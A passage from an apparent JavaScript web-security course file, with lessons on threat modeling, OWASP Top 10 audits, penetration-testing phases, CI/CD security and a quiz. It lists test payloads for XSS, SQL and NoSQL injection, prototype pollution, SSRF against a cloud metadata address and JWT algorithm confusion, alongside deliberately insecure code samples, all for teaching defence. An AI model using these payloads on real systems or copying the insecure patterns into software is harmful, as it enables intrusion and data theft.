  <span class="cmt">// Affected Users: How many impacted?</span>
  affectedUsers: <span class="num">10</span>,  <span class="cmt">// All users</span>
  
  <span class="cmt">// Discoverability: How easy to find?</span>
  discoverability: <span class="num">8</span>, <span class="cmt">// Automated scanners find it</span>
};

<span class="kw">const</span> score = (9 + 8 + 7 + 10 + 8) / 5; <span class="cmt">// = 8.4 ‚Üí CRITICAL</span>

<span class="cmt">// Rating scale:</span>
<span class="cmt">// 1-3: Low risk</span>
<span class="cmt">// 4-6: Medium risk</span>
<span class="cmt">// 7-10: High/Critical risk</span></code></pre>

<h2>üó∫Ô∏è Data Flow Diagram (DFD)</h2>
<p>Map how data moves through your system to identify trust boundaries:</p>
<pre><code><span class="cmt">/*
  Data Flow Diagram - Web Application

  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    HTTPS     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    Internal    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  ‚îÇ  Browser ‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ  Web       ‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ  API    ‚îÇ
  ‚îÇ  (User)  ‚îÇ ‚Üê‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  ‚îÇ  Server    ‚îÇ ‚Üê‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  ‚îÇ Server ‚îÇ
  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò             ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò               ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ                        ‚îÇ                           ‚îÇ
       ‚îÇ                   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  Trust Boundary 1         ‚îÇ  CDN    ‚îÇ           Trust ‚îÇ Database  ‚îÇ
  (Internet)               ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò        Boundary‚îÇ           ‚îÇ
                                               2      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                                              (Internal Network)

  Trust Boundaries = Where data crosses privilege levels
  ‚Üí Each crossing is a potential attack surface
*/</span></code></pre>

<h2>üå≥ Attack Trees</h2>
<p>Break down attack goals into sub-goals to understand all possible paths:</p>
<pre><code><span class="cmt">/*
  Goal: Steal User Credentials
  ‚îú‚îÄ‚îÄ Via XSS Attack
  ‚îÇ   ‚îú‚îÄ‚îÄ Stored XSS in comments [CSP, sanitize]
  ‚îÇ   ‚îú‚îÄ‚îÄ Reflected XSS in search [encode output]
  ‚îÇ   ‚îî‚îÄ‚îÄ DOM XSS via URL fragment [validate input]
  ‚îú‚îÄ‚îÄ Via Phishing
  ‚îÇ   ‚îú‚îÄ‚îÄ Fake login page [user education, 2FA]
  ‚îÇ   ‚îî‚îÄ‚îÄ Email spoofing [SPF, DKIM, DMARC]
  ‚îú‚îÄ‚îÄ Via Database Breach
  ‚îÇ   ‚îú‚îÄ‚îÄ SQL Injection [parameterized queries]
  ‚îÇ   ‚îú‚îÄ‚îÄ Exposed backup [encrypt, access control]
  ‚îÇ   ‚îî‚îÄ‚îÄ Weak DB password [strong credentials]
  ‚îî‚îÄ‚îÄ Via Man-in-the-Middle
      ‚îú‚îÄ‚îÄ HTTP downgrade [HSTS]
      ‚îú‚îÄ‚îÄ Rogue WiFi [certificate pinning]
      ‚îî‚îÄ‚îÄ DNS spoofing [DNSSEC]
      
  [brackets] = mitigations
*/</span></code></pre>

<h2>üîß Practical: Threat Model a Login System</h2>
<pre><code><span class="cmt">// Component: /api/login endpoint</span>
<span class="cmt">// STRIDE Analysis:</span>

<span class="kw">const</span> loginThreats = [
  {
    stride: <span class="str">'S'</span>, <span class="cmt">// Spoofing</span>
    threat: <span class="str">'Credential stuffing / brute force'</span>,
    mitigation: <span class="str">'Rate limiting, account lockout, CAPTCHA'</span>,
    priority: <span class="str">'HIGH'</span>
  },
  {
    stride: <span class="str">'S'</span>,
    threat: <span class="str">'Session hijacking'</span>,
    mitigation: <span class="str">'HttpOnly cookies, secure flag, session rotation'</span>,
    priority: <span class="str">'HIGH'</span>
  },
  {
    stride: <span class="str">'T'</span>, <span class="cmt">// Tampering</span>
    threat: <span class="str">'Token manipulation'</span>,
    mitigation: <span class="str">'Sign tokens, validate server-side'</span>,
    priority: <span class="str">'HIGH'</span>
  },
  {
    stride: <span class="str">'R'</span>, <span class="cmt">// Repudiation</span>
    threat: <span class="str">'No audit trail of login attempts'</span>,
    mitigation: <span class="str">'Log all auth events with timestamps + IP'</span>,
    priority: <span class="str">'MEDIUM'</span>
  },
  {
    stride: <span class="str">'I'</span>, <span class="cmt">// Information Disclosure</span>
    threat: <span class="str">'Username enumeration via error messages'</span>,
    mitigation: <span class="str">'Generic error: "Invalid credentials"'</span>,
    priority: <span class="str">'MEDIUM'</span>
  },
  {
    stride: <span class="str">'I'</span>,
    threat: <span class="str">'Timing attack reveals valid usernames'</span>,
    mitigation: <span class="str">'Constant-time comparison, always hash'</span>,
    priority: <span class="str">'LOW'</span>
  },
  {
    stride: <span class="str">'D'</span>, <span class="cmt">// DoS</span>
    threat: <span class="str">'Login endpoint flooded'</span>,
    mitigation: <span class="str">'Rate limiting, WAF, CDN'</span>,
    priority: <span class="str">'HIGH'</span>
  },
  {
    stride: <span class="str">'E'</span>, <span class="cmt">// Elevation of Privilege</span>
    threat: <span class="str">'Mass assignment: {role: "admin"} in body'</span>,
    mitigation: <span class="str">'Whitelist allowed fields, ignore role'</span>,
    priority: <span class="str">'CRITICAL'</span>
  }
];</code></pre>
`
},

// ---- LESSON 3 ----
{
  title: "Security Audits",
  icon: "üîç",
  content: `
<h1>üîç Security Audits</h1>
<p class="subtitle">Systematically review your code and infrastructure for vulnerabilities</p>

<h2>üìã Types of Security Testing</h2>
<table>
<tr><th>Type</th><th>What</th><th>When</th><th>Tools</th></tr>
<tr><td><strong>SAST</strong></td><td>Static analysis of source code</td><td>During development</td><td>ESLint, Semgrep, SonarQube</td></tr>
<tr><td><strong>DAST</strong></td><td>Dynamic analysis of running app</td><td>In staging/QA</td><td>OWASP ZAP, Burp Suite</td></tr>
<tr><td><strong>SCA</strong></td><td>Scan dependencies for CVEs</td><td>CI/CD pipeline</td><td>npm audit, Snyk, Dependabot</td></tr>
<tr><td><strong>IAST</strong></td><td>Instrumented testing</td><td>Integration testing</td><td>Contrast Security</td></tr>
<tr><td><strong>Pen Test</strong></td><td>Manual expert testing</td><td>Before major releases</td><td>Manual + tools</td></tr>
</table>

<h2>üèÜ OWASP Top 10 (2021) ‚Äî JS Focus</h2>

<div class="card card-warn">
<div class="card-title">A01: Broken Access Control (#1)</div>
<pre><code><span class="cmt">// ‚ùå Insecure Direct Object Reference (IDOR)</span>
app.get(<span class="str">'/api/user/:id'</span>, (req, res) => {
  <span class="kw">const</span> user = db.getUser(req.params.id);
  res.json(user); <span class="cmt">// Anyone can access any user!</span>
});

<span class="cmt">// ‚úÖ Verify ownership</span>
app.get(<span class="str">'/api/user/:id'</span>, auth, (req, res) => {
  <span class="kw">if</span> (req.params.id !== req.user.id && !req.user.isAdmin) {
    <span class="kw">return</span> res.status(<span class="num">403</span>).json({ error: <span class="str">'Forbidden'</span> });
  }
  <span class="kw">const</span> user = db.getUser(req.params.id);
  res.json(user);
});</code></pre>
</div>

<div class="card card-warn">
<div class="card-title">A02: Cryptographic Failures</div>
<pre><code><span class="cmt">// ‚ùå Weak hashing</span>
<span class="kw">const</span> hash = md5(password);              <span class="cmt">// Crackable in seconds</span>
<span class="kw">const</span> hash2 = crypto.createHash(<span class="str">'sha256'</span>) <span class="cmt">// No salt!</span>
  .update(password).digest(<span class="str">'hex'</span>);

<span class="cmt">// ‚úÖ bcrypt with proper cost factor</span>
<span class="kw">const</span> bcrypt = require(<span class="str">'bcrypt'</span>);
<span class="kw">const</span> hash = <span class="kw">await</span> bcrypt.hash(password, <span class="num">12</span>);
<span class="kw">const</span> match = <span class="kw">await</span> bcrypt.compare(input, hash);</code></pre>
</div>

<div class="card card-warn">
<div class="card-title">A03: Injection</div>
<pre><code><span class="cmt">// ‚ùå SQL Injection</span>
db.query(<span class="str">\`SELECT * FROM users WHERE name = '\${name}'\`</span>);

<span class="cmt">// ‚ùå NoSQL Injection</span>
db.users.find({ username: req.body.username,
                password: req.body.password }); 
<span class="cmt">// Attacker sends: {"password": {"$gt": ""}}</span>

<span class="cmt">// ‚úÖ Parameterized queries</span>
db.query(<span class="str">'SELECT * FROM users WHERE name = $1'</span>, [name]);

<span class="cmt">// ‚úÖ Validate NoSQL input types</span>
<span class="kw">if</span> (<span class="kw">typeof</span> req.body.password !== <span class="str">'string'</span>) {
  <span class="kw">throw new</span> Error(<span class="str">'Invalid input'</span>);
}</code></pre>
</div>

<h2>üîß npm Audit & Dependency Scanning</h2>
<pre><code><span class="cmt"># Check for known vulnerabilities</span>
$ npm audit

<span class="cmt"># Auto-fix where possible</span>
$ npm audit fix

<span class="cmt"># See detailed report</span>
$ npm audit --json

<span class="cmt"># In CI/CD ‚Äî fail build on high severity</span>
$ npm audit --audit-level=high

<span class="cmt"># Alternative: Snyk</span>
$ npx snyk test
$ npx snyk monitor  <span class="cmt"># Continuous monitoring</span></code></pre>

<h2>üîß ESLint Security Plugins</h2>
<pre><code><span class="cmt">// .eslintrc.js ‚Äî Security linting</span>
module.exports = {
  plugins: [<span class="str">'security'</span>, <span class="str">'no-unsanitized'</span>],
  extends: [<span class="str">'plugin:security/recommended'</span>],
  rules: {
    <span class="cmt">// Detect dangerous patterns</span>
    <span class="str">'security/detect-eval-with-expression'</span>: <span class="str">'error'</span>,
    <span class="str">'security/detect-non-literal-regexp'</span>: <span class="str">'warn'</span>,
    <span class="str">'security/detect-object-injection'</span>: <span class="str">'warn'</span>,
    <span class="str">'security/detect-possible-timing-attacks'</span>: <span class="str">'error'</span>,
    <span class="str">'no-unsanitized/method'</span>: <span class="str">'error'</span>,
    <span class="str">'no-unsanitized/property'</span>: <span class="str">'error'</span>,
  }
};</code></pre>

<h2>üìã Security Audit Checklist</h2>
<div class="checklist" id="auditChecklist">
  <label><input type="checkbox"> Authentication: Strong password policy enforced?</label>
  <label><input type="checkbox"> Authentication: MFA available?</label>
  <label><input type="checkbox"> Authentication: Account lockout after failed attempts?</label>
  <label><input type="checkbox"> Authorization: RBAC or ABAC implemented correctly?</label>
  <label><input type="checkbox"> Authorization: IDOR checks on all endpoints?</label>
  <label><input type="checkbox"> Input: All user input validated server-side?</label>
  <label><input type="checkbox"> Input: Parameterized queries used everywhere?</label>
  <label><input type="checkbox"> Output: Context-aware output encoding?</label>
  <label><input type="checkbox"> Headers: CSP, HSTS, X-Frame-Options set?</label>
  <label><input type="checkbox"> Cookies: HttpOnly, Secure, SameSite flags?</label>
  <label><input type="checkbox"> Dependencies: No known CVEs (npm audit)?</label>
  <label><input type="checkbox"> Secrets: No hardcoded credentials in code?</label>
  <label><input type="checkbox"> Logging: Security events logged (no PII)?</label>
  <label><input type="checkbox"> Error handling: No stack traces in production?</label>
  <label><input type="checkbox"> CORS: Properly restricted origins?</label>
  <label><input type="checkbox"> Rate limiting: Applied to auth & API endpoints?</label>
  <label><input type="checkbox"> File uploads: Type/size validated, stored safely?</label>
  <label><input type="checkbox"> HTTPS: Enforced everywhere?</label>
</div>
`
},

// ---- LESSON 4 ----
{
  title: "Penetration Testing Basics",
  icon: "‚öîÔ∏è",
  content: `
<h1>‚öîÔ∏è Penetration Testing Basics</h1>
<p class="subtitle">Think like an attacker to build better defenses</p>

<div class="card card-warn">
  <div class="card-title">‚ö†Ô∏è Legal Warning</div>
  <p>NEVER test systems you don't own or have written authorization to test. Unauthorized testing is illegal. Use practice environments like DVWA, Juice Shop, or HackTheBox.</p>
</div>

<h2>üìä Types of Pen Tests</h2>
<div class="grid-3">
  <div class="card"><div class="card-title">‚¨õ Black Box</div><p>No prior knowledge of the system. Simulates external attacker.</p></div>
  <div class="card"><div class="card-title">‚¨ú White Box</div><p>Full access to source code, architecture, credentials. Most thorough.</p></div>
  <div class="card"><div class="card-title">üî≤ Gray Box</div><p>Partial knowledge (e.g., user credentials). Simulates insider threat.</p></div>
</div>

<h2>üîÑ Penetration Testing Methodology (PTES)</h2>

<h3>Phase 1: Reconnaissance</h3>
<pre><code><span class="cmt">// Passive Recon ‚Äî no direct contact with target</span>
<span class="cmt">// 1. DNS enumeration</span>
<span class="cmt">//    dig example.com ANY</span>
<span class="cmt">//    nslookup -type=any example.com</span>

<span class="cmt">// 2. Subdomain discovery</span>
<span class="cmt">//    Using Certificate Transparency logs</span>
<span class="cmt">//    https://crt.sh/?q=%.example.com</span>

<span class="cmt">// 3. Technology fingerprinting</span>
<span class="cmt">//    Wappalyzer, BuiltWith, HTTP headers</span>

<span class="cmt">// JS-specific recon:</span>
<span class="cmt">// - View source ‚Üí find JS frameworks, API endpoints</span>
<span class="cmt">// - Check source maps (.map files) for source code</span>
<span class="cmt">// - Look for exposed API documentation</span>
<span class="cmt">// - Check robots.txt, sitemap.xml</span>
<span class="cmt">// - Search GitHub for leaked credentials</span>

<span class="cmt">// Active Recon in Browser DevTools:</span>
<span class="cmt">// Network tab ‚Üí API endpoints, auth tokens</span>
<span class="cmt">// Application tab ‚Üí localStorage, cookies</span>
<span class="cmt">// Console ‚Üí JS errors that leak info</span>
<span class="cmt">// Sources ‚Üí Source maps, hidden endpoints</span></code></pre>

<h3>Phase 2: Scanning & Enumeration</h3>
<pre><code><span class="cmt">// Tools for web app scanning:</span>
<span class="cmt">// OWASP ZAP ‚Äî Free, open source proxy/scanner</span>
<span class="cmt">// Burp Suite ‚Äî Industry standard (Community = free)</span>
<span class="cmt">// Nikto ‚Äî Web server scanner</span>

<span class="cmt">// What to look for:</span>
<span class="cmt">// - Open ports and services</span>
<span class="cmt">// - Directory listing enabled</span>
<span class="cmt">// - Default credentials</span>
<span class="cmt">// - Outdated software versions</span>
<span class="cmt">// - Missing security headers</span>
<span class="cmt">// - SSL/TLS misconfigurations</span>

<span class="cmt">// JavaScript-specific scanning:</span>
<span class="cmt">// - LinkFinder: extracts endpoints from JS files</span>
<span class="cmt">// - JSParser: parses JS for API routes</span>
<span class="cmt">// - RetireJS: finds vulnerable JS libraries</span></code></pre>

<h3>Phase 3: Vulnerability Testing</h3>
<pre><code><span class="cmt">// Common tests for JS/Node applications:</span>

<span class="cmt">// 1. XSS Testing</span>
<span class="cmt">// Try in every input field:</span>
<span class="kw">const</span> xssPayloads = [
  <span class="str">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>,
  <span class="str">'&lt;img src=x onerror=alert(1)&gt;'</span>,
  <span class="str">'" onmouseover="alert(1)'</span>,
  <span class="str">"javascript:alert(1)"</span>,
  <span class="str">'&lt;svg onload=alert(1)&gt;'</span>,
  <span class="str">"{{constructor.constructor('alert(1)')()}}"</span>, <span class="cmt">// Template injection</span>
];

<span class="cmt">// 2. Authentication Testing</span>
<span class="kw">const</span> authTests = [
  <span class="str">'Try SQL injection in login: admin\' OR 1=1--'</span>,
  <span class="str">'Test password reset token predictability'</span>,
  <span class="str">'Check if JWT can be set to alg:none'</span>,
  <span class="str">'Test for session fixation'</span>,
  <span class="str">'Verify token expiration is enforced'</span>,
];

<span class="cmt">// 3. Authorization Testing (IDOR)</span>
<span class="cmt">// GET /api/orders/123  ‚Üí Change to /api/orders/124</span>
<span class="cmt">// Can you access other users' data?</span>

<span class="cmt">// 4. API Testing</span>
<span class="cmt">// Try adding admin fields: {"role":"admin"}</span>
<span class="cmt">// Test HTTP methods: PUT/DELETE on GET-only endpoints</span>
<span class="cmt">// Send unexpected types: string where number expected</span></code></pre>

<h3>Phase 4: Exploitation Examples</h3>
<pre><code><span class="cmt">// Prototype Pollution (Node.js specific)</span>
<span class="cmt">// If app uses lodash merge or similar:</span>
<span class="kw">const</span> payload = JSON.parse(
  <span class="str">'{"__proto__": {"isAdmin": true}}'</span>
);

<span class="cmt">// Server-Side Request Forgery (SSRF)</span>
<span class="cmt">// If app fetches user-provided URLs:</span>
fetch(userUrl);  <span class="cmt">// attacker sends: http://169.254.169.254/</span>
<span class="cmt">// ‚Üí Accesses cloud metadata service!</span>

<span class="cmt">// JWT Algorithm Confusion</span>
<span class="cmt">// If server accepts both HS256 and RS256:</span>
<span class="cmt">// 1. Get the RSA public key</span>
<span class="cmt">// 2. Sign JWT with HS256 using public key as secret</span>
<span class="cmt">// 3. Server verifies with public key ‚Üí passes!</span>
<span class="cmt">// Fix: ALWAYS whitelist algorithms in verify()</span></code></pre>

<h3>Phase 5: Reporting</h3>
<pre><code><span class="cmt">// Professional pen test report structure:</span>
<span class="kw">const</span> report = {
  executiveSummary: <span class="str">'High-level findings for management'</span>,
  scope: <span class="str">'What was tested and what was excluded'</span>,
  methodology: <span class="str">'PTES / OWASP Testing Guide v4'</span>,
  findings: [
    {
      title: <span class="str">'Stored XSS in Comment Field'</span>,
      severity: <span class="str">'HIGH'</span>,
      cvss: <span class="num">7.6</span>,
      description: <span class="str">'User input in comments not sanitized...'</span>,
      stepsToReproduce: [<span class="str">'1. Navigate to...'</span>, <span class="str">'2. Enter payload...'</span>],
      impact: <span class="str">'Attacker can steal session cookies...'</span>,
      remediation: <span class="str">'Implement DOMPurify sanitization...'</span>,
      evidence: <span class="str">'[screenshots, request/response logs]'</span>,
    }
  ],
  positiveFindings: <span class="str">'What was done well'</span>,
  recommendations: <span class="str">'Prioritized action items'</span>,
};</code></pre>

<h2>üß™ Practice Environments</h2>
<div class="grid-2">
  <div class="card"><div class="card-title">üßÉ OWASP Juice Shop</div><p>Modern JS app intentionally insecure. Built with Angular + Node.js. Perfect for JS developers.</p></div>
  <div class="card"><div class="card-title">üéØ DVWA</div><p>Damn Vulnerable Web Application. PHP-based but teaches universal web security concepts.</p></div>
  <div class="card"><div class="card-title">üì¶ HackTheBox</div><p>Cybersecurity training platform with realistic challenges and machines.</p></div>
  <div class="card"><div class="card-title">üêõ PortSwigger Academy</div><p>Free labs covering all web vulnerabilities. Excellent for hands-on practice.</p></div>
</div>
`
},

// ---- LESSON 5 ----
{
  title: "Putting It All Together",
  icon: "üèóÔ∏è",
  content: `
<h1>üèóÔ∏è Putting It All Together</h1>
<p class="subtitle">Building a comprehensive security program for your JavaScript applications</p>

<h2>üîÑ Secure Development Lifecycle (SDL)</h2>
<pre><code><span class="cmt">/*
  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  ‚îÇ   DESIGN    ‚îÇ‚îÄ‚îÄ‚ñ∂‚îÇ    BUILD     ‚îÇ‚îÄ‚îÄ‚ñ∂‚îÇ    TEST     ‚îÇ
  ‚îÇ             ‚îÇ   ‚îÇ              ‚îÇ   ‚îÇ             ‚îÇ
  ‚îÇ ‚Ä¢ Threat    ‚îÇ   ‚îÇ ‚Ä¢ Secure     ‚îÇ   ‚îÇ ‚Ä¢ SAST      ‚îÇ
  ‚îÇ   Modeling  ‚îÇ   ‚îÇ   coding     ‚îÇ   ‚îÇ ‚Ä¢ DAST      ‚îÇ
  ‚îÇ ‚Ä¢ Security  ‚îÇ   ‚îÇ ‚Ä¢ Code       ‚îÇ   ‚îÇ ‚Ä¢ Pen test  ‚îÇ
  ‚îÇ   reqs      ‚îÇ   ‚îÇ   review     ‚îÇ   ‚îÇ ‚Ä¢ SCA       ‚îÇ
  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
        ‚ñ≤                                      ‚îÇ
        ‚îÇ           ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê            ‚îÇ
        ‚îÇ           ‚îÇ   DEPLOY    ‚îÇ            ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ             ‚îÇ‚óÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                    ‚îÇ ‚Ä¢ Security  ‚îÇ
                    ‚îÇ   headers   ‚îÇ
                    ‚îÇ ‚Ä¢ Monitoring‚îÇ
                    ‚îÇ ‚Ä¢ Incident  ‚îÇ
                    ‚îÇ   response  ‚îÇ
                    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
*/</span></code></pre>

<h2>üö® Incident Response Plan</h2>
<pre><code><span class="kw">const</span> incidentResponse = {
  <span class="cmt">// 1. DETECT</span>
  detection: {
    monitoring: [<span class="str">'Error rate spikes'</span>, <span class="str">'Unusual API patterns'</span>],
    alerts: [<span class="str">'Failed auth >10/min'</span>, <span class="str">'CSP violations'</span>],
    sources: [<span class="str">'WAF logs'</span>, <span class="str">'Application logs'</span>, <span class="str">'User reports'</span>],
  },
  
  <span class="cmt">// 2. RESPOND</span>
  response: {
    immediate: [
      <span class="str">'Assess severity and scope'</span>,
      <span class="str">'Contain: isolate affected systems'</span>,
      <span class="str">'Rotate compromised credentials'</span>,
      <span class="str">'Enable enhanced logging'</span>,
    ],
    communication: [
      <span class="str">'Notify security team lead'</span>,
      <span class="str">'Brief stakeholders (no details publicly)'</span>,
      <span class="str">'Prepare user notification if data breach'</span>,
    ],
  },
  
  <span class="cmt">// 3. RECOVER</span>
  recovery: [
    <span class="str">'Patch the vulnerability'</span>,
    <span class="str">'Deploy fix to production'</span>,
    <span class="str">'Verify fix with targeted testing'</span>,
    <span class="str">'Restore from clean backups if needed'</span>,
    <span class="str">'Monitor for re-exploitation'</span>,
  ],
  
  <span class="cmt">// 4. LEARN</span>
  postmortem: [
    <span class="str">'Timeline of events'</span>,
    <span class="str">'Root cause analysis'</span>,
    <span class="str">'What worked / what didn\\'t'</span>,
    <span class="str">'Action items to prevent recurrence'</span>,
    <span class="str">'Update threat model'</span>,
  ],
};</code></pre>

<h2>üîß Security in CI/CD Pipeline</h2>
<pre><code><span class="cmt">// .github/workflows/security.yml</span>
name: Security Pipeline
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      <span class="cmt"># 1. Dependency scanning</span>
      - name: npm audit
        run: npm audit --audit-level=high
      
      <span class="cmt"># 2. Static analysis</span>
      - name: ESLint Security
        run: npx eslint --config .eslintrc.security.js .
      
      <span class="cmt"># 3. Secret scanning</span>
      - name: GitLeaks
        uses: gitleaks/gitleaks-action@v2
      
      <span class="cmt"># 4. Container scanning (if Docker)</span>
      - name: Trivy
        uses: aquasecurity/trivy-action@master
      
      <span class="cmt"># 5. DAST (on staging)</span>
      - name: OWASP ZAP
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: <span class="str">'https://staging.myapp.com'</span></code></pre>

<h2>üìä Security Monitoring Dashboard</h2>
<pre><code><span class="cmt">// Key security metrics to track</span>
<span class="kw">const</span> securityMetrics = {
  <span class="cmt">// Real-time</span>
  failedAuthAttempts: <span class="str">'per minute, per IP'</span>,
  cspViolations: <span class="str">'grouped by directive'</span>,
  errorRate: <span class="str">'4xx and 5xx responses'</span>,
  rateLimitHits: <span class="str">'per endpoint'</span>,
  
  <span class="cmt">// Daily</span>
  dependencyVulns: <span class="str">'count by severity'</span>,
  certificateExpiry: <span class="str">'days until SSL cert expires'</span>,
  unusualPatterns: <span class="str">'ML-detected anomalies'</span>,
  
  <span class="cmt">// Weekly</span>
  codeReviewCoverage: <span class="str">'% of PRs with security review'</span>,
  meanTimeToRemediate: <span class="str">'avg time to fix vulnerabilities'</span>,
  securityTestCoverage: <span class="str">'% of code covered by security tests'</span>,
};</code></pre>

<div class="card card-success">
  <div class="card-title">üéì Interview Tip</div>
  <p>When discussing security in interviews, always frame your answers around <strong>risk</strong>. Don't just list vulnerabilities ‚Äî explain the <strong>impact</strong>, <strong>likelihood</strong>, and <strong>mitigation strategy</strong>. Show you think systematically, not just tactically.</p>
</div>
`
}
];

// ============================================================
// QUIZ QUESTIONS
// ============================================================
const quizQuestions = [
{
  q: "What does the Content-Security-Policy header `script-src 'self'` do?",
  options: [
    "Allows scripts only from the same origin",
    "Allows all scripts to execute",
    "Blocks all JavaScript completely",
    "Allows inline scripts only"
  ],
  correct: 0,
  explanation: "`script-src 'self'` means only scripts loaded from the same origin as the document can execute. Inline scripts and scripts from other domains are blocked unless explicitly allowed."
},
{
  q: "Which is the SAFEST way to prevent XSS when inserting user data into the DOM?",
  options: [
    "element.innerHTML = userInput",
    "element.textContent = userInput",
    "element.innerHTML = userInput.replace('<', '&lt;')",
    "element.outerHTML = sanitize(userInput)"
  ],
  correct: 1,
  explanation: "`textContent` automatically escapes HTML entities and treats all content as plain text. It's the safest way to insert untrusted data. innerHTML should be avoided with user input."
},
{
  q: "In STRIDE threat modeling, what does the 'E' stand for?",
  options: [
    "Encryption failure",
    "Exposure of data",
    "Elevation of Privilege",
    "Error handling"
  ],
  correct: 2,
  explanation: "STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. 'E' represents gaining unauthorized higher-level access."
},
{
  q: "What is the main risk of using `eval()` in JavaScript?",
  options: [
    "It's slower than alternatives",
    "It can execute arbitrary code from untrusted input",
    "It doesn't work in strict mode",
    "It's deprecated in ES6"
  ],
  correct: 1,
  explanation: "`eval()` executes a string as code. If that string contains user input, an attacker can inject arbitrary JavaScript. It's a critical code injection vector."
},
{
  q: "What HTTP header prevents your site from being embedded in an iframe?",
  options: [
    "Content-Security-Policy: frame-src 'none'",
    "X-Frame-Options: DENY",
    "X-Content-Type-Options: nosniff",
    "Referrer-Policy: no-referrer"
  ],
  correct: 1,
  explanation: "`X-Frame-Options: DENY` prevents the page from being displayed in any iframe. CSP's `frame-ancestors 'none'` is the modern equivalent, but X-Frame-Options is still recommended for backwards compatibility."
},
{
  q: "What is a 'nonce' in the context of CSP?",
  options: [
    "A type of encryption key",
    "A random value that allows specific inline scripts to execute",
    "A session identifier",
    "A CSRF token"
  ],
  correct: 1,
  explanation: "A CSP nonce is a random, single-use value generated per request. Only `<script>` tags with the matching nonce attribute are allowed to execute, blocking injected scripts that don't have the nonce."
},
{
  q: "Which cookie flag prevents JavaScript from accessing the cookie?",
  options: [
    "Secure",
    "SameSite=Strict",
    "HttpOnly",
    "Domain"
  ],
  correct: 2,
  explanation: "The `HttpOnly` flag makes the cookie inaccessible to JavaScript's `document.cookie`. This prevents XSS attacks from stealing session cookies."
},
{
  q: "In penetration testing, what is 'reconnaissance'?",
  options: [
    "Exploiting vulnerabilities",
    "Gathering information about the target before attacking",
    "Cleaning up after a test",
    "Writing the final report"
  ],
  correct: 1,
  explanation: "Reconnaissance (recon) is the first phase of pen testing where you gather information about the target: technologies used, subdomains, API endpoints, employee info, etc."
},
{
  q: "What is IDOR?",
  options: [
    "Internal DOM Object Reference ‚Äî a browser API",
    "Insecure Direct Object Reference ‚Äî accessing unauthorized resources by changing IDs",
    "Integrated Defense Operation Report ‚Äî a security standard",
    "Input Data Output Restriction ‚Äî a validation technique"
  ],
  correct: 1,
  explanation: "IDOR (Insecure Direct Object Reference) occurs when an application uses user-supplied input to access objects directly. E.g., changing `/api/orders/123` to `/api/orders/124` to view another user's order."
},
{
  q: "Which is the correct approach to input validation?",
  options: [
    "Blacklist dangerous characters",
    "Whitelist allowed characters/patterns",
    "Rely on client-side validation",
    "Encode all input before validation"
  ],
  correct: 1,
  explanation: "Whitelisting (allowlisting) defines exactly what IS allowed, rejecting everything else. Blacklisting tries to block what's bad but attackers always find bypasses."
},
{
  q: "What does HSTS (Strict-Transport-Security) do?",
  options: [
    "Encrypts the request body",
    "Forces browsers to always use HTTPS for the domain",
